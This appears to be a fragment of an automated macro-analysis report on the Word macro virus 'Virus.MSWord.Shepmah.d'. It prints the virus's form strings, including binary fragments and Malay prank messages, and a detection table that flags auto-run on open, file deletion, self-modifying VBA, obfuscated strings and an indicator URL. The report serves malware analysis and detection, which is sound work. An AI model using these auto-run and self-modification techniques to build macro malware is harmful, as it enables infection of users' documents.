- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Me�+Z��a�r�l�?4�7�D
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�8E*VъW�b
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��E.vы#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Psstt... Tengok sini la kawan.. ada mesej penting nak disampaikan. Bukan apa.. saja nak tutup mulut depa yang dok hingaq tu..
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/i02/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Apakah yang lebih dibenci bila semua kerja-kerja kita tegendala sebab birus? HAMPEHS! Greeting kepada yang tersayang sempena birthdaynya hari ini. ILU~! Kepada semua warga UTM. Jangan panic.. ENJOY! [DD/UTM'99]G
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/i02/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM Variable "b'Image1'" IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Frame1'" IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Msg'" IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Butang'" IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/i02'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |http://hampehs.cjb.n|URL                                          |
|          |et                  |                                             |
+----------+--------------------+---------------------------------------------+

